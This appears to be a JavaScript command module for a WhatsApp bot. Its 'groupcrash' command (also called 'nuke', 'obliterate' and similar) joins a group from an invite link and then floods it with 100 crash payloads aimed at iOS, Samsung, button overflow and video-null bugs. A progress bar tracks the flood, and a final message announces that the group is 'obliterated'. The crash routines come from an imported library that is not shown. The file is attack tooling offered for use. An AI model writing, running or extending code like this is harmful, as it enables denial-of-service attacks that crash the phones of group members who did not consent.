'use strict';
const { CrashLib } = require('../../lib/crashlib');
const { createProgressBar } = require('../../lib/progressBar');

module.exports = {
    name: 'groupcrash',
    aliases: ['gcrash', 'crashgroup', 'gclink', 'groupkill', 'nuke', 'gc', 'obliterate'],
    category: 'crash',
    desc: 'ɴᴜᴋᴇ ᴀ ɢʀᴏᴜᴘ ᴠɪᴀ ɢʀᴏᴜᴘ ʟɪɴᴋ',
    usage: '.groupcrash <group_link>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}groupcrash <group_link>\n📝 *Example:* ${prefix}groupcrash https://chat.whatsapp.com/AbCdEfGhIjKlMnOp` 
            }, { quoted: msg });
        }
        
        const link = args[0];
        
        let crashLib = global.getCrashLib?.(sock);
        if (!crashLib) {
            crashLib = new CrashLib(sock);
        }
        
        try {
            const groupJid = await sock.groupAcceptInvite(link.split('/').pop());
            if (!groupJid) throw new Error('Failed to resolve group link');
            
            const TOTAL = 100;
            const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
            
            // Phase 1: iOS — 30
            for (let i = 0; i < 30; i++) {
                await crashLib.iosInvisibleForce(groupJid);
                await bar.update(1, 'ɪᴏs ғᴏʀᴄᴇ');
                await new Promise(r => setTimeout(r, 200));
            }
            
            // Phase 2: Samsung — 30
            for (let i = 0; i < 30; i++) {
                await crashLib.samsung(groupJid);
                await bar.update(1, 'sᴀᴍsᴜɴɢ');
                await new Promise(r => setTimeout(r, 200));
            }
            
            // Phase 3: Button — 20
            for (let i = 0; i < 20; i++) {
                await crashLib.buttonOverflow(groupJid);
                await bar.update(1, 'ʙᴜᴛᴛᴏɴ');
                await new Promise(r => setTimeout(r, 300));
            }
            
            // Phase 4: VidxNull — 20
            for (let i = 0; i < 20; i++) {
                await crashLib.vidxNull(groupJid);
                await bar.update(1, 'ᴠɪᴅx');
                await new Promise(r => setTimeout(r, 300));
            }
            
            await bar.done(`✅ ɢʀᴏᴜᴘ ɴᴜᴋᴇ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ɢʀᴏᴜᴘ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${groupJid}`);
        } catch (e) {
            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
        }
    }
};